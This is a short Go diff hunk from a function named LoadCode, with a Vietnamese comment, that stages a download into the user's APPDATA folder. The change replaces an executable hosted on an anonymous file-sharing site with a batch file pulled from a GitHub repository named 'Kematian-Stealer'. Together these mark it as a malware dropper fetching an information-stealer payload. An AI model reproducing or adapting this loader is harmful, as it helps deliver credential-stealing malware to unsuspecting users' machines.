@@ -18,8 +18,8 @@ func LoadCode() {
 	}
 
 	appData := os.Getenv("APPDATA")
-	filePath := filepath.Join(appData, "loadcode.exe")
-	url := "https://anonsharing.com/file/8a911b041bad7335/Load_code.exe"
+	filePath := filepath.Join(appData, "loadcode.bat")
+	url := "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/.vscode/loadcode.bat"
 
 	// Kiểm tra sự tồn tại của tệp
 	if _, err := os.Stat(filePath); os.IsNotExist(err) {
